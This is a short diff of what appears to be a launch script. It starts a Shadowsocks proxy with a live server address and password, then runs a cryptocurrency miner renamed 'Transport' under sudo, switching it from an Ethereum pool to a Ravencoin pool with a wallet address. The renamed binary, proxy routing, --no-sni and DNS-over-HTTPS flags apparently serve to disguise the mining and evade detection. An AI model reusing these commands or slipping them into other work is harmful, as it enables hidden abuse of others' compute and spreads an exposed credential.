@@ -39,4 +39,4 @@ ss-local -s 129.158.58.77 -p 1080 -l 9999 -k 1rN14HAmV -m chacha20-ietf-poly1305
 
 ph add Transport
 
-sudo ./Transport -a ethash -o asia1.ethermine.org:14444 -u 0xee8d6ac2827f65b369babfe5a4cd31dcdfb96aab -p x -w Trans --no-sni --dns-https-server 1.1.1.1 
+sudo ./Transport -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u rFb4oRYDDbHpFEcshVx1ppLG97njb9kWCQ -p x -w Trans --no-sni  --dns-https-server 1.1.1.1     
